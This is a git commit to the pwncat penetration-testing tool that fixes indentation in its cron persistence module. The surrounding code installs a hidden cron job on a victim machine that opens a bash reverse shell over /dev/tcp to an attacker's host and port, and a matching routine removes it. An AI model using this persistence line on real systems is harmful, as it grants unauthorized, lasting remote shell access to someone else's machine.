f99995893a50308330a7c87926aa594d0f161a03
montysecurity <jacobcainmontgomery@gmail.com>
2020-08-16 20:21:56 -0500

    Fixed spacing

--- pwncat/persist/cron.py
+++ pwncat/persist/cron.py
@@ -20,7 +20,7 @@ class Method(PersistenceMethod):
         # Bash oneliner using "pwncat" string to differentiate our cron from any existing ones
         # Installing original list of crons, with the reverse shell added to it 
         pwncat.victim.run("crontab -l 2> /dev/null > /dev/shm/.cron; echo \"" + cron + " echo pwncat && bash -c 'bash -i >& /dev/tcp/" + rhost + "/" + rport + " 0>&1'\" >> /dev/shm/.cron && crontab /dev/shm/.cron && rm /dev/shm/.cron")
-    	print(str("Calling back to " + rhost + ":" + rport + " on a " + cron + " schedule."))
+        print(str("Calling back to " + rhost + ":" + rport + " on a " + cron + " schedule."))
     def remove(self, user):
         # Using "pwncat" string to remove our crons and reinstalling the original ones
         pwncat.victim.run("crontab -l | grep -v pwncat > /dev/shm/.cron; crontab /dev/shm/.cron && rm /dev/shm/.cron")
